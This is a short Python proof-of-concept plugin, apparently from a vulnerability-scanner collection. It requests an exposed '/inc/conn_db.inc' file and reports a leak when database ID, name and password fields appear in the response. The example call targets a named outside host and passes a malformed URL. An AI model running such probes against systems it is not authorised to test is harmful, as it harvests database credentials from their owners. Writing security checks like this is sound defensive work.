from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/env python
# Can import any built-in Python Library
import urlparse

class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/inc/conn_db.inc'
        curl=Curl()
        result = {}
        result['result']=False

        code, head, res, errcode, final_url = curl.curl(arg)
        if code == 200 and 'db_id' in res and  'db_name' in res and 'db_pass' in res:
             output(arg,result,'warning')
    
    

        del curl
        return result


def output(url,result,label):
    info = url + '  warning '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='information Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/www/www_4b5349a645e817306cbb82e775362ae2.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/www/www_4b5349a645e817306cbb82e775362ae2.py
#/root/github/poccreate/codesrc/exp-1233.py